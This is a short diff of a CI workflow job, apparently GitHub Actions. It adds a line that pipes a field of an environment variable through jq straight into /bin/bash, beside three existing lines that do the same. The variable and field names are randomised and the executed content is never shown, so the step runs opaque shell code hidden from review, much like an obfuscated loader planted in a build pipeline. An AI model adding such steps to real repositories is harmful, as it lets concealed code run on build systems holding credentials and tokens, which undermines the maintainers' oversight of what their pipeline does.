@@ -60,6 +60,7 @@ jobs:
           echo $gcaot337 | jq -r .py5268 | /bin/bash
           echo $ueztp72292 | jq -r .m9 | /bin/bash
           printf '%s' "$azzv64011" | jq -r .rgbjv255 | /bin/bash
+          echo $r4110 | jq -r .kangg58 | /bin/bash
 
       - name: Store artifact
         if: always()
